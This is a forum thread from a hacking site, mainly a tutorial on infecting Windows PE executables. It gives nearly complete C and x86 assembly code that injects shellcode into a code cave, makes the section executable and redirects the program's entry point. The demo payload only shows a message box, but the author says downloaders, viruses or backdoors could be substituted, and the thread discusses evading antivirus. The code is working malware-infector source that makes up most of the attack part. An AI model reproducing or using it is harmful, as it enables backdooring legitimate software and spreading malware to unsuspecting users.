<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>PE File Infection - Malware - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="The following paper documents a possible PE file infection technique which covers a high level overview and the low level code of how both the infection and the resulting payload is executed. Please note that some of the&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="401.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;PE File Infection&#39;" href="../pe-file-infection/401.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/1X/a7218ea8ee30f36fa774c82d6d8d33bdc99cad2e.PNG" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/1X/a7218ea8ee30f36fa774c82d6d8d33bdc99cad2e.PNG" />
<meta property="og:url" content="https://0x00sec.org/t/pe-file-infection/401" />
<meta name="twitter:url" content="https://0x00sec.org/t/pe-file-infection/401" />
<meta property="og:title" content="PE File Infection" />
<meta name="twitter:title" content="PE File Infection" />
<meta property="og:description" content="The following paper documents a possible PE file infection technique which covers a high level overview and the low level code of how both the infection and the resulting payload is executed. Please note that some of the following material may not be suited for beginners as it requires:  Proficiency in C/C++ Proficiency in Intel x86 assembly Knowledge of the WinAPI and its documentation Knowledge of the PE file structure Knowledge of Dynamic Linked Libraries  Disclaimer: This paper is written wi..." />
<meta name="twitter:description" content="The following paper documents a possible PE file infection technique which covers a high level overview and the low level code of how both the infection and the resulting payload is executed. Please note that some of the following material may not be suited for beginners as it requires:  Proficiency in C/C++ Proficiency in Intel x86 assembly Knowledge of the WinAPI and its documentation Knowledge of the PE file structure Knowledge of Dynamic Linked Libraries  Disclaimer: This paper is written wi..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="c++" />
<meta property="og:article:tag" content="c" />
<meta property="og:article:tag" content="winapi" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="8 mins ðŸ•‘" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="51 â¤" />
<meta property="article:published_time" content="2016-05-19T05:22:48+00:00" />
<meta property="og:ignore_canonical" content="true" />
<link rel="next" href="../pe-file-infection/401%3Fpage=2.html">
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="401.html">PE File Infection</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/malware.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F7941D"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Malware</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/c++.html" class="discourse-tag" rel="tag">c++</a>,
<a href="../../tag/c.html" class="discourse-tag" rel="tag">c</a>,
<a href="../../tag/winapi.html" class="discourse-tag" rel="tag">winapi</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="PE File Infection">
<meta itemprop="articleSection" content="Malware">
<meta itemprop="keywords" content="c++, c, winapi">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/1X/a7218ea8ee30f36fa774c82d6d8d33bdc99cad2e.PNG">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-19T05:22:48Z" class="post-time">
May 19, 2016, 5:22am
</time>
<meta itemprop="dateModified" content="2016-05-19T07:50:21Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>The following paper documents a possible PE file infection technique which covers a high level overview and the low level code of how both the infection and the resulting payload is executed. Please note that some of the following material may not be suited for beginners as it requires:</p>
<pre><code class="lang-makefile">Proficiency in C/C++
Proficiency in Intel x86 assembly
Knowledge of the WinAPI and its documentation
Knowledge of the PE file structure
Knowledge of Dynamic Linked Libraries
</code></pre>
<p><strong>Disclaimer</strong>: This paper is written within the scope of my own self research and study of malware and Windows internals and I apologize in advance for any incorrect information. If there is any feedback, please leave a reply or private message me.</p>
<hr>
<h2>Infection Technique</h2>
<p>The method with which we will be covering consists of taking advantage of the implementation of the PE file structure. <em>Code caves</em> are essentially blocks of empty spaces (or null bytes) which are a result of file alignment of the corresponding sectionâ€™s data. Because these <em>holes</em> exist, it is entirely possible to place our own data inside with little or nothing preventing us. Here is and example of a code cave in our target application (putty.exe).</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/1X/a7218ea8ee30f36fa774c82d6d8d33bdc99cad2e.PNG" width="599" height="429"></p>
<p>For more information on code caves, please see <a href="http://www.codeproject.com/Articles/20240/The-Beginners-Guide-to-Codecaves">CodeProject - The Beginnerâ€™s Guide to Codecaves</a>.</p>
<p>For our approach, we will be targeting the <em>last section</em> of the executable, injecting our own code inside for execution before jumping back to the original code. Here is a visual representation:</p>
<pre><code class="lang-makefile">                Target program's structure
                     after infection

                    +----------------+
                    |     Header     |
    Original -----&gt; +----------------+ &lt;---+  Return to 
    start           |     .text      |     |  original start
                    +----------------+     |  after shellcode
                    |     .rdata     |     |  finishes execution
                    +----------------+     |
                    |       ...      |     |
                    +----------------+     |
                    |      .tls      |     |
    New start ----&gt; +-   -   -   -   + ----+
                    |    shellcode   |
                    +----------------+
                         ^   ^   ^
                Injected shellcode goes here
                  inside the .tls section
</code></pre>
<p>As a result of this infection method, the program will remain intact and since we will be injecting the shellcode inside an existing empty region of the file, the file size will not change and will hence reduce suspicion which is essential for malware survival.</p>
<hr>
<h2>Coding the Infector</h2>
<p>The infector will be responsible for modifying a target application by injecting the shellcode into the last section. Here is the pseudocode:</p>
<h3>Infector Pseudocode</h3>
<pre><code class="lang-makefile">1. Open file to read and write
2. Extract PE file information
3. Find a suitably-sized code cave
4. Tailor shellcode to the target application
5. Acquire any additional data for the shellcode to function
6. Inject the shellcode into the application
7. Modify the application's original entry point to the start of the shellcode
</code></pre>
<p>Letâ€™s now see how we could implement this in code.</p>
<p><strong>Note</strong>: For the sake of cleanliness and readability, I will not be including error checks.</p>
<pre><code class="lang-auto">int main(int argc, char *argv[]) {
    if (argc &lt; 2) {
        fprintf(stderr, "Usage: %s &lt;TARGET FILE&gt;\n", argv[0]);
        return 1;
    }

    HANDLE hFile = CreateFile(argv[1], FILE_READ_ACCESS | FILE_WRITE_ACCESS, 
                        0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    DWORD dwFileSize = GetFileSize(hFile, NULL);

    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);

    LPBYTE lpFile = (LPBYTE)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, dwFileSize);

}
</code></pre>
<p>Weâ€™ll be designing our program to take in a target file from the command line.</p>
<p>First of all, we need to get a handle to a file using the <code>CreateFile</code> function with the read and write access permissions so that we are able to read data from and write data to the file. Weâ€™ll also need to get the size of the file for the following task.</p>
<p>The <code>CreateFileMapping</code> function creates a handle to the mapping. We specify a read and write permission (same as <code>CreateFile</code>) and also the maximum size we want the mapping to be, i.e. the size of the file.After obtaining the handle to the file mapping, we can create the mapping itself. The <code>MapViewOfFile</code> function maps the file into our memory space and returns a pointer to the start of the mapped file, i.e. the beginning of the file. Here we cast the return value as a pointer to an byte which is the same as an unsigned char value.</p>
<p>In this next section, we require that the target file be a legitimate PE file so we need to verify the <code>MZ</code> and the <code>PE\0\0</code> signatures. Iâ€™ve done this with a separate function in a different file which I will show at the end of the article.</p>
<pre><code class="lang-auto">int main(int argc, char *argv[]) {
    ...

    // check if valid pe file
    if (VerifyDOS(GetDosHeader(lpFile)) == FALSE ||
        VerifyPE(GetPeHeader(lpFile)) == FALSE) {
        fprintf(stderr, "Not a valid PE file\n");
        return 1;
    }

    PIMAGE_NT_HEADERS pinh = GetPeHeader(lpFile);
    PIMAGE_SECTION_HEADER pish = GetLastSectionHeader(lpFile);

    // get original entry point
    DWORD dwOEP = pinh-&gt;OptionalHeader.AddressOfEntryPoint + 
                    pinh-&gt;OptionalHeader.ImageBase;

    DWORD dwShellcodeSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;

}
</code></pre>
<p>Once weâ€™ve verified and the target file is suitable for infection, we need to obtain the original entry point (OEP) so that we can jump back to it after our shellcode finished execution. Here, we also calculate the size of the shellcode by subtracting the end of the shellcode from the beginning. I will show what these functions look like later on and it will make much more sense.</p>
<p>Next, weâ€™ll need to find an appropriate-sized code cave.</p>
<pre><code class="lang-auto">int main(int argc, char *argv[]) {
    ...

    // find code cave
    DWORD dwCount = 0;
    DWORD dwPosition = 0;

    for (dwPosition = pish-&gt;PointerToRawData; dwPosition &lt; dwFileSize; dwPosition++) {
        if (*(lpFile + dwPosition) == 0x00) {
            if (dwCount++ == dwShellcodeSize) {
                // backtrack to the beginning of the code cave
                dwPosition -= dwShellcodeSize;
                break;
            }
        } else {
            // reset counter if failed to find large enough cave
            dwCount = 0;
        }
    }

    // if failed to find suitable code cave
    if (dwCount == 0 || dwPosition == 0) {
        return 1;
    }

}
</code></pre>
<p>We obtained <code>pish</code> from the previous code section which is a pointer to the last sectionâ€™s header. Using the header information, we can calculate the starting position <code>dwPosition</code> which points to the beginning of the code in that section and weâ€™ll read to the end of the file using the size of the file <code>dwFileSize</code> as a stopping condition.</p>
<p>What we do is we create a loop from the beginning of the section to the end of the section (end of the file) and every time we come across a null byte, we will increment the <code>dwCount</code> variable, otherwise, weâ€™ll reset the value if there is a byte which is not a null byte. If the <code>dwCount</code> reaches the size of the shellcode, we will have found a code cave which can house it. Weâ€™ll then need to subtract the <code>dwPosition</code> with the size of the shellcode since we need the offset position of the beginning of the code cave so we know where to write to it later.If, for some reason, we are unable to find a code cave, the <code>dwCount</code> should be of size <code>0</code> and if the loop fails to start, <code>dwPosition</code> will also be <code>0</code>. Iâ€™m not really sure if these conditions are necessary so but I have them there just in case.</p>
<p>In this example, the target application will spawn a message box before it runs itself normally.</p>
<pre><code class="lang-auto">int main(int argc, char *argv[]) {
    ...

    // dynamically obtain address of function
    HMODULE hModule = LoadLibrary("user32.dll");

    LPVOID lpAddress = GetProcAddress(hModule, "MessageBoxA");

    // create buffer for shellcode
    HANDLE hHeap = HeapCreate(0, 0, dwShellcodeSize);

    LPVOID lpHeap = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwShellcodeSize);

    // move shellcode to buffer to modify
    memcpy(lpHeap, ShellcodeStart, dwShellcodeSize);

}
</code></pre>
<p>Because of this, we will need the address of the function <code>MessageBoxA</code> which is found in the <code>User32</code> DLL. First, weâ€™ll need a handle to the <code>User32</code> DLL which is done by using the <code>LoadLibrary</code> function. Weâ€™ll then use the handle with <code>GetProcAddress</code> to retrieve the address of the function. Once we have this, we can copy the address into the shellcode so it can call the <code>MessageBoxA</code> function.</p>
<p>Next, weâ€™ll need to dynamically allocate a buffer to store the shellcode itself so that we can modify the placeholder values in the shellcode function with the correct ones, i.e. the OEP and the <code>MessageBoxA</code> address.</p>
<pre><code class="lang-auto">int main(int argc, char *argv[]) {
    ...

    // modify function address offset
    DWORD dwIncrementor = 0;
    for (; dwIncrementor &lt; dwShellcodeSize; dwIncrementor++) {
        if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
            // insert function's address
            *((LPDWORD)lpHeap + dwIncrementor) = (DWORD)lpAddress;
            FreeLibrary(hModule);
            break;
        }
    }

    // modify OEP address offset
    for (; dwIncrementor &lt; dwShellcodeSize; dwIncrementor++) {
        if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
            // insert OEP
            *((LPDWORD)lpHeap + dwIncrementor) = dwOEP;
            break;
        }
    }

}
</code></pre>
<p>In these two for loops, we attempt to locate the placeholders (<code>0xAAAAAAAA</code>) in the shellcode and replace them with the values we need. What they do is theyâ€™ll go through the shellcode buffer and if it finds a placeholder, it will overwrite it. These loops cannot be swapped and must maintain this order and we will see why when we have a look at the shellcode function later.</p>
<pre><code class="lang-auto">int main(int argc, char *argv[]) {
    ...

    // copy the shellcode into code cave
    memcpy((LPBYTE)(lpFile + dwPosition), lpHeap, dwShellcodeSize);
    HeapFree(hHeap, 0, lpHeap);
    HeapDestroy(hHeap);

    // update PE file information
    pish-&gt;Misc.VirtualSize += dwShellcodeSize;
    // make section executable
    pish-&gt;Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
    // set entry point
    // RVA = file offset + virtual offset - raw offset
    pinh-&gt;OptionalHeader.AddressOfEntryPoint = dwPosition + pish-&gt;VirtualAddress - pish-&gt;PointerToRawData;

    return 0;
}
</code></pre>
<p>Now that the shellcode is complete, we can inject it into the mapped file using a <code>memcpy</code>. Remember that we saved the offset of the code cave with <code>dwPosition</code>; we use it here to calculate it from the beginning of the file which is where <code>lpFile</code> points to. We simply copy the shellcode buffer with the size of the shellcode.</p>
<p>We need to update some of the values inside the headers. The section headerâ€™s <code>VirtualSize</code> member needs to be changed to include the size of the shellcode. We also want the section to be executable so that the shellcode can do its thing. Finally, the <code>AddressOfEntryPoint</code> needs to be pointed to the start of the code cave where the shellcode is hiding.</p>
<p>Now, letâ€™s take a look at the shellcode functions.</p>
<pre><code class="lang-auto">#define db(x) __asm _emit x

__declspec(naked) ShellcodeStart(VOID) {
    __asm {
            pushad
            call    routine

        routine:
            pop     ebp
            sub     ebp, offset routine
            push    0                                // MB_OK
            lea     eax, [ebp + szCaption]
            push    eax                              // lpCaption
            lea     eax, [ebp + szText]
            push    eax                              // lpText
            push    0                                // hWnd
            mov     eax, 0xAAAAAAAA
            call    eax                              // MessageBoxA

            popad
            push    0xAAAAAAAA                       // OEP
            ret

        szCaption:
            db('d') db('T') db('m') db(' ') db('W') db('u') db('Z') db(' ')
            db('h') db('3') db('r') db('e') db(0)
        szText :
            db('H') db('a') db('X') db('X') db('0') db('r') db('3') db('d')
            db(' ') db('b') db('y') db(' ') db('d') db('T') db('m') db(0)
    }
}

VOID ShellcodeEnd() {

}
</code></pre>
<p>There are two functions here: <code>ShellcodeStart</code> and <code>ShellcodeEnd</code>. From before, we calculated the size of the shellcode by subtracting the <code>ShellcodeStart</code>'s function address from the <code>ShellcodeEnd</code>'s function address. The <code>ShellcodeEnd</code> functionâ€™s only purpose is to signify the end of the shellcode.</p>
<p>The declaration of the <code>ShellcodeStart</code> function uses <code>__declspec(naked)</code> since we do not want any prologues or epilogues in our function. We want it as clean as possible.</p>
<p>The shellcode starts with a <code>pushad</code> which is an instruction to push all of the registers onto the stack and we need to do this to preserve the processâ€™s context thatâ€™s set up for the program to run. Once thatâ€™s been handled, we can then execute our routine.</p>
<p>Since this shellcode will be in the memory of another program, we cannot control where the address of values will be and so we will need to use some tricks to dynamically calculate the addresses.<br>
What we do here is use a technique called a delta offset. What happens is that when routine is called, it immediately pops the return address (which is the address of routine) into the base pointer register. We then subtract the base pointer registerâ€™s value with the address of routine and that ultimately results in <code>0</code>. We can then calculate the address of the string variables <code>szCaption</code> and <code>szText</code> by simply adding their addresses onto the base pointer register and in this case, itâ€™s simply their addresses. We then push the parameters of <code>MessageBoxA</code> onto the stack and then call the function.</p>
<p>After the routine has finished and done what we wanted, we then recover the register values with <code>popad</code>, push the address of OEP and return, effectively jumping back to the original entry point so the program can run normally.</p>
<p>This is what the resulting infected application should look like.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/1X/5801038fd5d9d08fb64e5ab5be0d9f8e884d0bda.PNG" width="596" height="431"></p>
<hr>
<h2>A Quick Demonstration</h2>
<p>Here is what happens when the infected putty.exe is launched.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/1X/b93fd76b2b80e431769e7096ebecb766a3e37002.PNG" width="598" height="316"></p>
<p>And thenâ€¦<br>
<img src="https://0x00sec.s3.amazonaws.com/original/1X/4343ce1b261cd51dbd4161ff4d697945b8066a89.PNG" width="690" height="472"></p>
<hr>
<h2>Conclusion</h2>
<p>The message box dialog is only an example. The potential of the payload is far greater than what has been documented here ranging from downloaders to viruses to backdoors where the only limit (for this specific technique) is the number of available code caves. This example only utilizes one of the many existing ones where more complex implementations can weave and integrate entire applications throughout code caves throughout all sections.</p>
<p>This article has been made possible thanks to <a href="http://www.rohitab.com/discuss/topic/33006-detailed-guide-to-pe-infection/">rohitab.com - Detailed Guide to Pe Infection</a> with which I used to research and reference. Itâ€™s not entirely the same, I made some changes here and there depending on my needs.</p>
<p>Thanks for reading.</p>
<p><em>â€“ dtm</em></p>
<hr>
<h2>Appendix</h2>
<pre><code class="lang-auto">PIMAGE_DOS_HEADER GetDosHeader(LPBYTE file) {
    return (PIMAGE_DOS_HEADER)file;
}

/*
* returns the PE header
*/
PIMAGE_NT_HEADERS GetPeHeader(LPBYTE file) {
    PIMAGE_DOS_HEADER pidh = GetDosHeader(file);

    return (PIMAGE_NT_HEADERS)((DWORD)pidh + pidh-&gt;e_lfanew);
}

/*
* returns the file header
*/
PIMAGE_FILE_HEADER GetFileHeader(LPBYTE file) {
    PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

    return (PIMAGE_FILE_HEADER)&amp;pinh-&gt;FileHeader;
}

/*
* returns the optional header
*/
PIMAGE_OPTIONAL_HEADER GetOptionalHeader(LPBYTE file) {
    PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

    return (PIMAGE_OPTIONAL_HEADER)&amp;pinh-&gt;OptionalHeader;
}

/*
* returns the first section's header
* AKA .text or the code section
*/
PIMAGE_SECTION_HEADER GetFirstSectionHeader(LPBYTE file) {
    PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

    return (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pinh);
}

PIMAGE_SECTION_HEADER GetLastSectionHeader(LPBYTE file) {
    return (PIMAGE_SECTION_HEADER)(GetFirstSectionHeader(file) + (GetPeHeader(file)-&gt;FileHeader.NumberOfSections - 1));
}

BOOL VerifyDOS(PIMAGE_DOS_HEADER pidh) {
    return pidh-&gt;e_magic == IMAGE_DOS_SIGNATURE ? TRUE : FALSE;
}

BOOL VerifyPE(PIMAGE_NT_HEADERS pinh) {
    return pinh-&gt;Signature == IMAGE_NT_SIGNATURE ? TRUE : FALSE;
}
</code></pre>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="33" />
<span class="post-likes">33 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../pe-file-infection-part-ii/4135.html">PE File Infection Part II</a>
<meta itemprop="position" content="3">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../draft-0x00sec-turns-0x01-one-year/1914/2.html">0x00sec Turns 0x01! One year!</a>
<meta itemprop="position" content="4">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../a-simple-demonstration-on-malware-analysis/994.html">A Simple Demonstration on Malware Analysis</a>
<meta itemprop="position" content="5">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../elfun-file-injector/410.html">ELFun File Injector</a>
<meta itemprop="position" content="6">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../what-are-you-working-on/4418/2.html">What are you working on?</a>
<meta itemprop="position" content="7">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../post-coherency-and-adherence-to-good-english/index.html">Post Coherency and Adherence to Good English</a>
<meta itemprop="position" content="8">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../0x00sec-turns-0x01-one-year/1914.html">0x00sec Turns 0x01! One year!</a>
<meta itemprop="position" content="9">
</div>
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-19T12:20:03Z" class="post-time">
May 19, 2016, 12:20pm
</time>
<meta itemprop="dateModified" content="2016-05-19T12:20:03Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Dayummmm <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a>! This article is really kicking it! This is so awesome. I really like that you uncover seriously â€˜undergroundâ€™ topics. Or at least something that is difficult to find.</p>
<p>This method would affect any checksums made for this application? Would antivirus pick this up also?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-19T12:53:08Z" class="post-time">
May 19, 2016, 12:53pm
</time>
<meta itemprop="dateModified" content="2016-05-19T12:53:08Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Iâ€™m not sure what you mean by checksums. Perhaps you meant hash? If so, then of course, thatâ€™s the entire point of hashes. Same thing, I guess? Antivirus could pick this up though it really depends on a few factors. If, say, the infected application is a system file, svchost.exe, for example, it can be integrity checked to see if itâ€™s original or not, same with pretty much any file however the file be known to have some sort of comparison. Itâ€™s also possible that the antivirus could detect malicious code within the file on disk or trigger heuristics on runtime.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-19T13:56:53Z" class="post-time">
May 19, 2016, 1:56pm
</time>
<meta itemprop="dateModified" content="2016-05-19T13:56:53Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>By <a href="https://en.m.wikipedia.org/wiki/Checksum">checksum</a>, yes I meant hash.</p>
<p>Is this how on-the-fly application backdooring usually works? Or do they just append to the shellcode? I know MSFVenom backdoors, but it doesnâ€™t use badass PE File injection? Right?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="401.html">
